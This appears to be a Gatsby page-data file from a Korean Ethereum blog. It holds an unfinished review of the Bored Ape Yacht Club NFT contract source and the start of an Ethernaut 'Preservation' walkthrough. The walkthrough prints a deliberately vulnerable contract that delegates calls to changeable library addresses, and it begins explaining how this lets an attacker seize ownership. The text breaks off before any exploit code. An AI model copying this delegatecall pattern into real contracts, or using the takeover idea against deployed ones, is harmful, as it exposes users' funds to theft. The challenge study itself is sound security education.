{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/code_review/BoredApeYachtClub_codeReview/BoredApeYachtClub_codeReview/",
    "result": {"data":{"cur":{"id":"c77d2301-622d-52f0-95f4-de829869c733","html":"<h1 id=\"-bored-ape-yacht-club---contract-review\" style=\"position:relative;\"><a href=\"#-bored-ape-yacht-club---contract-review\" aria-label=\" bored ape yacht club   contract review permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 Bored Ape Yacht Club - Contract Review</h1>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">BoredApeYachtClub</span> <span class=\"token keyword\">is</span> ERC721<span class=\"token punctuation\">,</span> Ownable <span class=\"token punctuation\">{</span>\r\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> BAYC_PROVENANCE <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> startingIndexBlock<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> startingIndex<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> apePrice <span class=\"token operator\">=</span> <span class=\"token number\">80000000000000000</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//0.08 ETH</span>\r\n\r\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> maxApePurchase <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> MAX_APES<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> saleIsActive <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> REVEAL_TIMESTAMP<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> name<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> maxNftSupply<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> saleStart<span class=\"token punctuation\">)</span> <span class=\"token function\">ERC721</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> symbol<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        MAX_APES <span class=\"token operator\">=</span> maxNftSupply<span class=\"token punctuation\">;</span>\r\n        REVEAL_TIMESTAMP <span class=\"token operator\">=</span> saleStart <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">86400</span> <span class=\"token operator\">*</span> <span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">{</span>\r\n        <span class=\"token builtin\">uint</span> balance <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\r\n        msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">/**\r\n     * Set some Bored Apes aside\r\n     */</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">reserveApes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">{</span>        \r\n        <span class=\"token builtin\">uint</span> supply <span class=\"token operator\">=</span> <span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token builtin\">uint</span> i<span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">30</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n            <span class=\"token function\">_safeMint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> supply <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">/**\r\n     * DM Gargamel in Discord that you're standing right behind him.\r\n     */</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setRevealTimestamp</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> revealTimeStamp<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">{</span>\r\n        REVEAL_TIMESTAMP <span class=\"token operator\">=</span> revealTimeStamp<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span> \r\n\r\n    <span class=\"token comment\">/*     \r\n    * Set provenance once it's calculated\r\n    */</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setProvenanceHash</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> provenanceHash<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">{</span>\r\n        BAYC_PROVENANCE <span class=\"token operator\">=</span> provenanceHash<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setBaseURI</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> baseURI<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">{</span>\r\n        <span class=\"token function\">_setBaseURI</span><span class=\"token punctuation\">(</span>baseURI<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">/*\r\n    * Pause sale if active, make active if paused\r\n    */</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">flipSaleState</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">{</span>\r\n        saleIsActive <span class=\"token operator\">=</span> <span class=\"token operator\">!</span>saleIsActive<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">/**\r\n    * Mints Bored Apes\r\n    */</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">mintApe</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> numberOfTokens<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>saleIsActive<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Sale must be active to mint Ape\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>numberOfTokens <span class=\"token operator\">&lt;=</span> maxApePurchase<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Can only mint 20 tokens at a time\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>numberOfTokens<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> MAX_APES<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Purchase would exceed max supply of Apes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>apePrice<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>numberOfTokens<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Ether value sent is not correct\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        \r\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> numberOfTokens<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n            <span class=\"token builtin\">uint</span> mintIndex <span class=\"token operator\">=</span> <span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> MAX_APES<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">_safeMint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> mintIndex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n            <span class=\"token punctuation\">}</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// If we haven't set the starting index and this is either 1) the last saleable token or 2) the first token to be sold after</span>\r\n        <span class=\"token comment\">// the end of pre-sale, set the starting index block</span>\r\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>startingIndexBlock <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> MAX_APES <span class=\"token operator\">||</span> block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">>=</span> REVEAL_TIMESTAMP<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n            startingIndexBlock <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span> \r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">/**\r\n     * Set the starting index for the collection\r\n     */</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setStartingIndex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>startingIndex <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Starting index is already set\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>startingIndexBlock <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Starting index block must be set\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        \r\n        startingIndex <span class=\"token operator\">=</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span><span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>startingIndexBlock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> MAX_APES<span class=\"token punctuation\">;</span>\r\n        <span class=\"token comment\">// Just a sanity case in the worst case if this function is called late (EVM only stores last 256 block hashes)</span>\r\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>startingIndexBlock<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n            startingIndex <span class=\"token operator\">=</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span><span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> MAX_APES<span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n        <span class=\"token comment\">// Prevent default sequence</span>\r\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>startingIndex <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n            startingIndex <span class=\"token operator\">=</span> startingIndex<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">/**\r\n     * Set the starting index block for the collection, essentially unblocking\r\n     * setting starting index\r\n     */</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">emergencySetStartingIndexBlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>startingIndex <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Starting index is already set\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        \r\n        startingIndexBlock <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h2 id=\"a\" style=\"position:relative;\"><a href=\"#a\" aria-label=\"a permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>a</h2>\n<h2 id=\"b\" style=\"position:relative;\"><a href=\"#b\" aria-label=\"b permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>b</h2>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#a\">a</a></li>\n<li><a href=\"#b\">b</a></li>\n</ul>\n</div>","excerpt":"👋 Bored Ape Yacht Club - Contract Review a b a b","frontmatter":{"date":"January 24, 2022","title":"Bored Ape Yacht Club - Contract Review (Writing)","categories":"ethereum","author":"한성원","emoji":"🧢"},"fields":{"slug":"/code_review/BoredApeYachtClub_codeReview/BoredApeYachtClub_codeReview/"}},"next":{"id":"d8d59912-8875-5219-91fe-88c7c14e7c5f","html":"<h1 id=\"-1-preservation\" style=\"position:relative;\"><a href=\"#-1-preservation\" aria-label=\" 1 preservation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 1. Preservation</h1>\n<p><strong>Difficulty 8/10</strong></p>\n<ul>\n<li>승리 조건</li>\n<li>코드 분석</li>\n<li>풀이</li>\n</ul>\n<p>순서로 진행 될 것이다.</p>\n<hr>\n<h2 id=\"승리-조건\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"승리 조건 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>승리 조건</h2>\n<ul>\n<li>instance의 ownership을 가져오면 승리한다.</li>\n</ul>\n<hr>\n<h2 id=\"코드-분석\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>코드 분석</h2>\n<p>이미 잘 설명되어있어 간단한 분석만 주석에 적었다!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Preservation</span> <span class=\"token punctuation\">{</span>\r\n    \r\n    <span class=\"token comment\">// public library contracts </span>\r\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> timeZone1Library<span class=\"token punctuation\">;</span> <span class=\"token comment\">// slot 0</span>\r\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> timeZone2Library<span class=\"token punctuation\">;</span> <span class=\"token comment\">// slot 1</span>\r\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span> <span class=\"token comment\">// slot 2</span>\r\n    <span class=\"token builtin\">uint</span> storedTime<span class=\"token punctuation\">;</span> <span class=\"token comment\">// slot 3</span>\r\n\r\n    <span class=\"token comment\">// Sets the function signature for delegatecall</span>\r\n    <span class=\"token builtin\">bytes4</span> <span class=\"token keyword\">constant</span> setTimeSignature <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes4</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"setTime(uint256)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token comment\">// timeZone에 대한 LibraryAddress 등록 및 owner 등록</span>\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _timeZone1LibraryAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _timeZone2LibraryAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        timeZone1Library <span class=\"token operator\">=</span> _timeZone1LibraryAddress<span class=\"token punctuation\">;</span> \r\n        timeZone2Library <span class=\"token operator\">=</span> _timeZone2LibraryAddress<span class=\"token punctuation\">;</span> \r\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n    \r\n\r\n    <span class=\"token comment\">// set the time for timezone 1</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setFirstTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _timeStamp<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        timeZone1Library<span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>setTimeSignature<span class=\"token punctuation\">,</span> _timeStamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">// set the time for timezone 2</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setSecondTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _timeStamp<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        timeZone2Library<span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>setTimeSignature<span class=\"token punctuation\">,</span> _timeStamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token comment\">// Simple library contract to set the time</span>\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">LibraryContract</span> <span class=\"token punctuation\">{</span>\r\n\r\n    <span class=\"token comment\">// stores a timestamp </span>\r\n    <span class=\"token builtin\">uint</span> storedTime<span class=\"token punctuation\">;</span>  \r\n\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _time<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        storedTime <span class=\"token operator\">=</span> _time<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h2 id=\"풀이\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"풀이 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h2>\n<p>이 문제에서 우리의 목표는 ownership을 가져오는 것이다.</p>\n<p>여기서 우리가 꼭 알아야하는 개념은 delegate call이다. 나도 delegate call에 대해서 2번이나 다뤘지만 이 문제를 풀기 전까지 모호했던 것 같다.\r\n이 문제를 완벽하게 이해할 수 있다면 delegate call에 대해서 좀 더 확신을 가질 수 있을 것이다.</p>\n<h3 id=\"delegate-call은-무엇인가\" style=\"position:relative;\"><a href=\"#delegate-call%EC%9D%80-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80\" aria-label=\"delegate call은 무엇인가 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Delegate Call은 무엇인가?</h3>\n<ul>\n<li><a href=\"https://holyhansss.github.io/vulnerability/delegate_call/delegate_call/\">Delegate Call 취약점</a></li>\n<li><a href=\"https://holyhansss.github.io/ethernaut/6_delegation_ethernaut/6_delegation_ethernaut/\">Delegation ethernaut 문제 6</a></li>\n</ul>\n<p>위 링크에서 delegate call에 대한 개념을 복습해보자! <del>구글에 좋은 자료도 많아요ㅎㅎ</del></p>\n<p>Delegate call은 call과 비슷하지만 다른 2가지 특징을 더 가지고 있다.</p>\n<ol>\n<li>호출한 contract의 context를 기반으로 동작된다.</li>\n<li>storage layout은 delegatecall을 이용하는 contract와 같아야한다.</li>\n</ol>\n<p>1번과 2번 특징 모두 이번 문제에 중요한 key이다.\r\n1번 특징에 관해서는 위 글에서 확인할 수 있고 2번 특징 같은 경우 <a href=\"https://holyhansss.github.io/ethernaut/12_privacy_ethernaut/12_privacy_ethernaut/\">Privacy 문제 ethernaut 12</a>에서 확인 할 수 있다.</p>\n<h3 id=\"풀이-1\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4-1\" aria-label=\"풀이 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 